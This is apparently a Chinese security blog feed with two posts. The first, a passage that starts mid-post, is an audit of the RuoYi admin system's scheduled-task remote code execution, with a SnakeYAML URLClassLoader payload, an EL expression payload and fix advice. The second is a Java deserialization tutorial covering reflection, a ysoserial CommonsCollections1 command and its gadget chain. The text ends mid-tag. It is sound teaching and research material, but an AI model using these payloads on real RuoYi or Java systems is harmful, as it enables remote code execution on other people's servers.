</span>&#123;</span><br><span class="line">    String host = <span class="hljs-string">"www.baidu.com"</span>;</span><br><span class="line">    String file = <span class="hljs-string">"/index.html"</span>;</span><br><span class="line"></span><br><span class="line">    String[] schames = &#123;<span class="hljs-string">"http"</span>, <span class="hljs-string">"https"</span>, <span class="hljs-string">"ftp"</span>, <span class="hljs-string">"mailto"</span>, <span class="hljs-string">"telnet"</span>, <span class="hljs-string">"file"</span>, <span class="hljs-string">"ldap"</span>, <span class="hljs-string">"gopher"</span>,</span><br><span class="line">            <span class="hljs-string">"jdbc"</span>, <span class="hljs-string">"rmi"</span>, <span class="hljs-string">"jndi"</span>, <span class="hljs-string">"jar"</span>, <span class="hljs-string">"doc"</span>, <span class="hljs-string">"netdoc"</span>, <span class="hljs-string">"nfs"</span>, <span class="hljs-string">"verbatim"</span>, <span class="hljs-string">"finger"</span>, <span class="hljs-string">"daytime"</span>,</span><br><span class="line">            <span class="hljs-string">"systemresource"</span>, <span class="hljs-string">"webService"</span>, <span class="hljs-string">"redis"</span>, <span class="hljs-string">"zookeeper"</span>, <span class="hljs-string">"rest"</span>, <span class="hljs-string">"thrift"</span>, <span class="hljs-string">"dubbo"</span>&#125;;</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; schames.length; i++) &#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            URL url = <span class="hljs-keyword">new</span> URL(schames[i], host, file);</span><br><span class="line">            System.out.println(<span class="hljs-string">"滋瓷 "</span> + schames[i] + <span class="hljs-string">" 协议"</span>);</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            System.out.println(<span class="hljs-string">"不滋瓷 "</span> + schames[i] + <span class="hljs-string">" 协议"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/04/若依反序列漏洞复现及其修复绕过/屏幕截图 2021-08-31 232835.png" alt></p><p>在测试结果中一眼就能看到<code>file</code>协议和<code>ftp</code>协议，还有个<code>jar</code>协议也是可以使用的，但还是需要借助其他协议才能下载<code>jar</code>包，就没必要多此一举了。</p><p><code>ftp</code>协议的漏洞利用和<code>http</code>协议的其实差不多，把POC中的协议改一改，ftp服务可以使用python的<code>pyftpdlib</code>模块搭一个。</p><p><code>file</code>协议的利用需要把jar包上传到网站上，通知公告模块的编辑器可以上传文件，虽然有文件后缀的白名单过滤，但并不影响<code>URL</code>类加载jar包。不过上传文件返回的路径并不是网站上物理路径，在spring的配置文件<code>application.yml</code>中可以看到windows的默认路径为<code>D:/ruoyi/uploadPath</code>，linux的默认路径为<code>/home/ruoyi/uploadPath</code>。</p><p><img src="/2021/09/04/若依反序列漏洞复现及其修复绕过/屏幕截图 2021-09-03 163337.png" alt></p><p><img src="/2021/09/04/若依反序列漏洞复现及其修复绕过/屏幕截图 2021-09-03 163545.png" alt></p><p>所以物理路径是<code>D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt</code>，最后的payload如下。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.yaml.snakeyaml.Yaml.load(&apos;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;file:/D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt&quot;]]]]&apos;)</span><br></pre></td></tr></table></figure><h2 id="一些其他尝试"><a href="#一些其他尝试" class="headerlink" title="一些其他尝试"></a>一些其他尝试</h2><p>除了过滤不严，还想到了两种构造payload的方法，分别为从依赖包和项目中寻找合适的类和方法。由于系统框架是Spring的，一开始想到的是用SpEL表达式来实现命令执行，但是后面试了下才知道<code>parseExpression</code>方法生成表达式对象后，这个对象还得调用<code>getValue</code>方法才会解析这个表达式。后面陆陆续续看了些质料，发现EL表达式似乎符合这个系统的场景。简单的介绍下EL表达式，他是一种可在JSP和JSPX中使用的语言，可在脚本中获取参数、执行运算、获取对象和调用函数等。</p><p>在Java代码中可以使用<code>ELProcessor</code>对象的<code>eval</code>解析EL表达式，经过简单构造可得出payload如下：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.el.ELProcessor.eval(&apos;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[\&apos;(java.lang.String[])\&apos;]([\&apos;cmd\&apos;,\&apos;/c\&apos;,\&apos;calc\&apos;]).start()&quot;)&apos;)</span><br></pre></td></tr></table></figure><p>然而一跑起来就抛出了<code>ELException</code>异常，调试跟到反射调用的地方发现EL表达式只剩下<code>&quot;&quot;.getClass(</code>。</p><p><img src="/2021/09/04/若依反序列漏洞复现及其修复绕过/屏幕截图 2021-09-04 171330.png" alt></p><p>最后回去找，大意了。在<code>StringUtils</code>工具类的<code>substringBetween</code>方法，也就是他获取参数的方法中发现它匹配的右括号是传入payload中的第一个，也就是payload中调用的方法不能出现左括号，否则无法获取到所有的参数。</p><p><img src="/2021/09/04/若依反序列漏洞复现及其修复绕过/屏幕截图 2021-09-04 172942.png" alt></p><p>除了依赖包中的类，还找了一圈项目中的类，发现一个yaml的工具类<code>YamlUtil</code>的<code>loadYaml</code>方法可能合适，于是又简单的构造了个payload：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.ruoyi.common.utils.YamlUtil.loadYaml(&apos;D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt&apos;)</span><br></pre></td></tr></table></figure><p>这次则是抛出了<code>FileNotFoundException</code>，因为<code>getResourceAsStream</code>方法无法获取ClassPath外的文件，实在是学艺不精。</p><p>后续在项目中还发现了另一个可利用的点，<code>FileUtils</code>工具类的<code>deleteFile</code>方法可以实现任意文件删除，但本文的目标是getshell，而且利用方法也很简单，这里就不再具述。</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>借着漏洞条例的颁布，这里献上本人的修复建议。其实在我上一个审计的系统中也是有定时任务功能的，也是通过反射的方式调用任务的实现代码，但是用户只能传入实现这个方法的类名，系统实例化这个类并调用特定的方法。</p><p>在这个系统中当然可以使用黑白名单的方式对可实例化的类进行过滤，但这样似乎修复得不彻底。如果使用调用特定方法的方式执行任务，只需设置一个比较特殊的方法名，这个漏洞就很难利用起来了，实际上这个系统用到的quartz任务调度框架就是使用类似的方式，作为调度任务的类续实现quartz的<code>Job</code>接口，并重写<code>execute</code>方法。</p><p>当然，以上只是个人对这个漏洞修复的小小看法，仅供参考。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本来想找到更高大上的payload，最后还只是找到过滤不严的问题，总的来说还是学艺不精。不过了解到各种表达式还是颇有收获，最后各位师傅若想到其他payload，望不吝赐教。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/r00tuser/p/14693462.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/14693462.html</a></p><p><a href="https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E</a></p><p><a href="https://blog.csdn.net/weixin_41725792/article/details/109818161" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41725792/article/details/109818161</a></p><p><a href="https://zhuanlan.zhihu.com/p/183902092" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/183902092</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;学完了Java反序列化，在CNVD上找了个有Java反序列化漏洞的系统练练手，叫若依后台管理系统，在github上的star数也不少。我是挺喜欢这个名字的，&lt;strong&gt;你若不离不弃、我必生死相依&lt;/strong&gt;，这个寓意可是作者的官方解读，不是我瞎编的。😆&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
    
    
    <category term="反序列化" scheme="http://127.0.0.1/tags/反序列化/"/>
    
  </entry>
  
  <entry>
    <title>JAVA反序列化学习</title>
    <link href="http://127.0.0.1/2021/08/24/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <id>http://127.0.0.1/2021/08/24/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-08-24T07:45:53.000Z</published>
    <updated>2021-08-24T07:49:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>回顾完PHP反序列化，接着就来学习Java反序列化了。距离上一篇PHP反序列化水文过去快半个月了，感觉时间过得好快啊，在某些特殊时刻也好煎熬啊。不管怎么说，这段时间看了好多Java反序列化的文章，也动手复现了下，对反序列化的原理、利用条件、利用方法有了初步的认识。 胡诌了这么多，就下来是对Java反序列化学习的记录。</p><a id="more"></a><h2 id="Java序列化简介"><a href="#Java序列化简介" class="headerlink" title="Java序列化简介"></a>Java序列化简介</h2><p>Java的序列化也是和PHP序列化一样，为了实现对象的持久化。除此之外，Java序列化还可通过的网络通信，实现在不同的平台传输对象，出现的场景有JNDI的RMI和LADP等。</p><h2 id="Java序列化与反序列化"><a href="#Java序列化与反序列化" class="headerlink" title="Java序列化与反序列化"></a>Java序列化与反序列化</h2><p>Java不同于PHP可以序列化和反序列化任意类，Java只有本类或父类实现了<code>Serializable</code>或<code>Externalizable</code>接口，且若实例变量引用了其他对象，该对象也需要能被序列化。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Unserialize</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">public</span> Object obj;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Unserialize obj = <span class="hljs-keyword">new</span> Unserialize();</span><br><span class="line">        obj.obj = <span class="hljs-keyword">new</span> SerializableTest();</span><br><span class="line">        FileOutputStream out = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">"test.txt"</span>);</span><br><span class="line">        ObjectOutputStream obj_out = <span class="hljs-keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        obj_out.writeObject(obj);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        FileInputStream in = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">"test.txt"</span>);</span><br><span class="line">        ObjectInputStream in_obj = <span class="hljs-keyword">new</span> ObjectInputStream(in);</span><br><span class="line">        in_obj.readObject();</span><br><span class="line">        in_obj.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SerializableTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若序列化一个没有实现<code>Serializable</code>的类，则会抛出<code>NotSerializableException</code>异常。<code>Externalizable</code>是<code>Serializable</code>的子类，序列化的用法一样，但必须重写<code>readExternal</code>和<code>writeExternal</code>方法。序列化的结果是以<code>ACED</code>开头的字节序列，Java也是按一定的规则进行序列化的，但序列化结果的可读性没有PHP那么高。</p><p><img src="/2021/08/24/JAVA反序列化学习/屏幕截图 2021-08-16 165203.png" alt></p><p>Java序列化并没有PHP这么多的魔术方法，只有当序列化的类重写了<code>readObject</code>或<code>readExternal</code>方法，才能作为反序列化漏洞的入口。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Unserialize</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="hljs-string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Unserialize obj = <span class="hljs-keyword">new</span> Unserialize();</span><br><span class="line">        FileOutputStream out = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">"test.txt"</span>);</span><br><span class="line">        ObjectOutputStream obj_out = <span class="hljs-keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        obj_out.writeObject(obj);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        FileInputStream in = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">"test.txt"</span>);</span><br><span class="line">        ObjectInputStream in_obj = <span class="hljs-keyword">new</span> ObjectInputStream(in);</span><br><span class="line">        in_obj.readObject();</span><br><span class="line">        in_obj.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，实际情况下没人会直接在<code>readObject</code>中写个命令执行的功能。通常情况下，反序列化漏洞都是使用多个可序列化的类形成利用链，然后利用反射机制实现想要的功能。</p><h2 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h2><p>反射机制可以实现在编译时无需确定所使用的的类，在运行时再确定。对任意一个类，都能知道这个类的所有属性和方法，对任意一个对象，都能调用它的任意一个方法和属性。</p><p>以下代码是以反射的方式实现弹计算器，先后通过<code>Class.forName</code>获取<code>Class</code>实例，然后<code>getMethod</code>获取方法，最后<code>invoke</code>调用方法。对于一些需要使用实例调用的方法，首先需要通过<code>getConstructor</code>方法获取构造方法实例，再调用<code>newInstance</code>方法获取该类的实例。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reflect</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class runtime = Class.forName(<span class="hljs-string">"java.lang.Runtime"</span>);</span><br><span class="line">        Method getRuntime = runtime.getMethod(<span class="hljs-string">"getRuntime"</span>);</span><br><span class="line">        Method exec = runtime.getMethod(<span class="hljs-string">"exec"</span>,String.class);</span><br><span class="line">        exec.invoke(getRuntime.invoke(runtime), <span class="hljs-string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面形如<code>getXXX</code>的方法都是只能获取默认构造函数或公有方法和属性，获取非默认构造函数或非公有方法和属性需要使用形如<code>getDeclaredXXX</code>的方法，非公有方法和属性还需使用<code>setAccessible</code>方法设置可访问。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reflect</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class reflectTest = Class.forName(<span class="hljs-string">"com.test.ReflectTest"</span>);</span><br><span class="line">        Constructor constructor = reflectTest.getDeclaredConstructor(String.class);</span><br><span class="line">        Object test = constructor.newInstance(<span class="hljs-string">"calc"</span>);</span><br><span class="line">        Method execute = reflectTest.getDeclaredMethod(<span class="hljs-string">"execute"</span>);</span><br><span class="line">        execute.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        execute.invoke(test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReflectTest</span> </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">private</span> String cmd;</span><br><span class="line">    ReflectTest() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ReflectTest(String cmd) &#123;</span><br><span class="line">        <span class="hljs-keyword">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> (cmd.isEmpty())</span><br><span class="line">            cmd = <span class="hljs-string">"calc"</span>;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反序列化利用"><a href="#反序列化利用" class="headerlink" title="反序列化利用"></a>反序列化利用</h2><p>反序列化利用复现经典的<code>CommonsCollections</code>POP链，还有RMI攻击服务端和JNDI注入。</p><h3 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h3><p><code>CommonsCollections1</code>是Java反序列化利用工具<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>其中的一个payload，由于<code>commons-collections</code>这个依赖包应用很广泛，所以这个payload很通用，但对jre是有要求的，版本需要在1.7u21以下。</p><p>POP链构造，本文通过下断点调试来学习。<code>CommonsCollections1</code>的payload使用以下的命令生成，值得注意的是，windows下不能用powershell生成payload，生成的payload是错的，会多出来<code>00</code>字节。</p><figure class="highlight powershell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .\ysoserial.jar CommonsCollections1 <span class="hljs-string">"calc.exe"</span> &gt; cc.bin</span><br></pre></td></tr></table></figure><p>反序列化的入口直接通过文件输入序列化内容并反序列化即可，同时需要在<code>Runtime</code>的<code>exec</code>方法下个断点。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DebugUnserialize</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        FileInputStream file = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">"cc1.bin"</span>);</span><br><span class="line">        ObjectInputStream in = <span class="hljs-keyword">new</span> ObjectInputStream(file);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动调试就能在IDEA中看到调用栈，除去反序列化和正常<code>invoke</code>方法的调用，与反序列化POP链相关的调用栈有红框这三块，主要的是中间这一块。</p><p><img src="/2021/08/24/JAVA反序列化学习/屏幕截图 2021-08-18 132311.png" alt></p><p>从栈顶往栈底看，<code>InvokerTransformer</code>的<code>transform</code>方法最终反射调用<code>Runtime</code>的<code>exec</code>方法。跟进<code>InvokerTransformer</code>的<code>transform</code>方法，当<code>input</code>非空时会进行一个反射方式调用方法的操作。<code>iMethodName</code>、<code>iParamTypes</code>和<code>iArgs</code>是<code>InvokerTransformer</code>的属性，属于可控变量，而<code>input</code>不是该类的属性，此时<code>input</code>的值为<code>Runtime</code>的实例。</p><p><img src="/2021/08/24/JAVA反序列化学习/屏幕截图 2021-08-18 135406.png" alt></p><p>回溯到<code>ChainedTransformer</code>的<code>transform</code>方法，一个<code>for</code>循环遍历<code>iTransformers</code>属性，并调用他的<code>transform</code>方法，该方法的<code>object</code>参数除了第一个之外，其他都是上一个循环<code>transform</code>的返回值。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>iTransformers</code>是一个<code>Transformer</code>数组，而<code>Transformer</code>是一个接口，上面的两个类<code>ChainedTransformer</code>和<code>InvokerTransformer</code>都实现了这个接口。当前<code>iTransformers</code>的大小为5，包含一个<code>ConstantTransformer</code>，三个<code>InvokerTransformer</code>，再加一个<code>ConstantTransformer</code>，感觉整个POP链最巧妙的就在这里。</p><p><img src="/2021/08/24/JAVA反序列化学习/屏幕截图 2021-08-18 143836.png" alt></p><p>第一个<code>ConstantTransformer</code>直接返回他的<code>iConstant</code>属性，此时<code>iConstant</code>为<code>Runtime</code>的Class实例。</p><p><img src="/2021/08/24/JAVA反序列化学习/屏幕截图 2021-08-18 144551.png" alt></p><p>接着的<code>InvokerTransformer</code>，经过一次<code>getMethod</code>再加一次反射方式调用的<code>getMethod</code>获取到<code>getRuntime</code>的Method实例，并返回。</p><p><img src="/2021/08/24/JAVA反序列化学习/屏幕截图 2021-08-18 150904.png" alt></p><p>接着的<code>InvokerTransformer</code>，经过两次<code>invoke</code>调用了上一个循环返回<code>getRuntime</code>方法，并返回执行结果。这里的<code>iArgs</code>也就是第二次的<code>invoke</code>的参数，是一个<code>null</code>和一个空<code>Object</code>数组，再复现时把我整懵了，为啥不用对象调用<code>getRuntime</code>方法。后面想起来<code>getRuntime</code>是静态方法，查资料得知静态方法用<code>invoke</code>反射调用，第一个参数传<code>null</code>即可。</p><p><img src="/2021/08/24/JAVA反序列化学习/屏幕截图 2021-08-18 151943.png" alt></p><p>最后一个<code>InvokerTransformer</code>利用上一个循环<code>getRuntime</code>返回的<code>Runtime</code>实例，反射调用<code>exec</code>执行命令。</p><p>继续回溯，跟进到<code>LazyMap</code>的<code>get</code>方法，<code>map</code>属性不存在键为<code>key</code>的值，然后使用<code>factory</code>属性调用<code>tranform</code>方法。这里令<code>factory</code>为下一调用栈里的<code>ChainedTransformer</code>即可。</p><p><img src="/2021/08/24/JAVA反序列化学习/屏幕截图 2021-08-18 151943.png" alt></p><p>再继续回溯，在<code>AnnotationInvocationHandler</code>的<code>invoke</code>方法里面使用调用<code>memberValues</code>属性调用<code>get</code>方法。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">    String var4 = var2.getName();</span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">"equals"</span>) &amp;&amp; var5.length == <span class="hljs-number">1</span> &amp;&amp; var5[<span class="hljs-number">0</span>] == Object.class) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.equalsImpl(var3[<span class="hljs-number">0</span>]);</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var5.length != <span class="hljs-number">0</span>) &#123;</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AssertionError(<span class="hljs-string">"Too many parameters for an annotation method"</span>);</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="hljs-keyword">switch</span>(var7) &#123;</span><br><span class="line">        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="hljs-keyword">default</span>:</span><br><span class="line">            Object var6 = <span class="hljs-keyword">this</span>.memberValues.get(var4);</span><br></pre></td></tr></table></figure><p><code>AnnotationInvocationHandler</code>是非公有的类，需要反射来构造，唯一的一个构造函数的第一个参数需要是注解的类，且存在一个接口，接口也是需要有注解，否则就会抛出一个<code>AnnotationFormatError</code>异常。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="hljs-keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="hljs-number">1</span> &amp;&amp; var3[<span class="hljs-number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="hljs-keyword">this</span>.type = var1;</span><br><span class="line">        <span class="hljs-keyword">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AnnotationFormatError(<span class="hljs-string">"Attempt to create proxy for a non-annotation type."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>java.lang.annotaion</code>包下很多接口都满足这个条件。</p><p><img src="/2021/08/24/JAVA反序列化学习/20210819104545.png" 